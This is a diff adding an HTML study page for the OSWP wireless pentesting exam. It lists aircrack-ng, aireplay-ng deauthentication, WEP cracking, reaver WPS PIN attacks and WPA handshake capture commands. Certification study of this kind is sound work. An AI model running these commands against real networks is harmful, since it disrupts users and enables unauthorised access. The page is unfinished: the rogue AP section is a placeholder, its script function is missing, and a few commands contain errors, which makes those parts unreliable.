@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>OSWP Study Guide</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0; padding: 0;
+      background: #f4f4f4;
+      color: #222;
+    }
+    header {
+      background: #1a1a1a;
+      color: white;
+      text-align: center;
+      padding: 1em 0;
+    }
+    .container {
+      max-width: 900px;
+      margin: 20px auto;
+      padding: 0 15px;
+    }
+    h1, h2 {
+      margin-bottom: 0.25em;
+    }
+    h2 {
+      border-bottom: 2px solid #ccc;
+      padding-bottom: 5px;
+      margin-top: 2em;
+    }
+    pre {
+      background: #272822;
+      color: #f8f8f2;
+      padding: 1em;
+      border-radius: 6px;
+      overflow-x: auto;
+      font-size: 0.9em;
+      line-height: 1.4em;
+      margin-bottom: 1em;
+    }
+    button.toggle {
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 0.4em 0.8em;
+      cursor: pointer;
+      margin-bottom: 0.5em;
+      font-size: 0.9em;
+    }
+    button.toggle:hover {
+      background-color: #0056b3;
+    }
+    .content {
+      display: none;
+      margin-bottom: 1em;
+    }
+    ul {
+      margin-left: 1.2em;
+      margin-bottom: 1em;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>OSWP Study Guide</h1>
+  <p>Offensive Security PEN-210 Command Reference</p>
+</header>
+
+<div class="container">
+
+  <section>
+    <h2>Dependencies</h2>
+    <pre>sudo apt install airmon-ng reaver hashcat hostapd dnsmasq nftables apache2 libapache2-mod-php freeradius</pre>
+  </section>
+
+  <section>
+    <h2>Open Network with MAC Filtering</h2>
+    <button class="toggle" onclick="toggleContent(this)">Toggle Details</button>
+    <div class="content">
+      <p>If fake authentication persistently fails, MAC filtering might be enabled. Capture a legitimate MAC with Airodump-ng, wait for client disconnect, then impersonate the MAC. Do NOT fake authenticate if the client is still active.</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>Packet Capture & Attacks</h2>
+    <pre>
+airodump-ng -w &lt;CAPTURE_NAME&gt; -c &lt;CHANNEL&gt; --bssid &lt;BSSID&gt; &lt;INTERFACE&gt;
+macchanger --show &lt;INTERFACE&gt;
+aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;YOUR_MAC&gt; &lt;INTERFACE&gt;
+aireplay-ng -3 -b &lt;BSSID&gt; -h &lt;YOUR_MAC&gt; &lt;INTERFACE&gt;
+aireplay-ng -0 1 -a &lt;BSSID&gt; -c &lt;CLIENT_MAC&gt; &lt;INTERFACE&gt;
+aircrack-ng &lt;CAPTURE_NAME&gt;
+    </pre>
+  </section>
+ <section>
+    <h2>WEP Exploitation</h2>
+    <button class="toggle" onclick="toggleContent(this)">Toggle Steps</button>
+    <div class="content">
+      <pre>
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon --encrypt WEP
+besside-ng -c Channel -b BSSID wlan0mon
+aircrack-ng ./wep.cap
+      </pre>
+      <p>Additional WEP Attacks: Hirte, Caffe Latte</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>WPS Attacks</h2>
+    <pre>
+wash -i &lt;INTERFACE&gt; -s
+aireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;BSSID&gt; -h &lt;YOUR_MAC&gt; &lt;INTERFACE&gt;
+reaver -i wlan0 -b BSSID -SNLAvv -c 1 -K
+reaver -i &lt;INTERFACE&gt; -b &lt;BSSID&gt; -SNLAsvv -d 1 -r 5:3 -c &lt;CHANNEL&gt;
+    </pre>
+  </section>
+
+  <section>
+    <h2>WPA/WPA2/WPA3 Testing</h2>
+    <button class="toggle" onclick="toggleContent(this)">Toggle Steps</button>
+    <div class="content">
+      <p>Capture handshakes, deauth clients, analyze with Wireshark, extract certs, setup FreeRADIUS, configure hostapd-mana.</p>
+      <pre>
+airmon-ng check kill && airmon-ng start &lt;interface&gt;
+airodump-ng &lt;interface&gt;
+sudo airodump-ng -c channel -w ESSID interface
+aireplay-ng -0 0 -a ESSID -c client_ESSID interface
+openssl x509 -inform der -in cert.der -text
+      </pre>
+    </div>
+  </section>
+
+  <section>
+    <h2>Rogue Access Point Setup</h2>
+    <pre>
+
+enter code
+</pre>
+</section>
+
+</html>
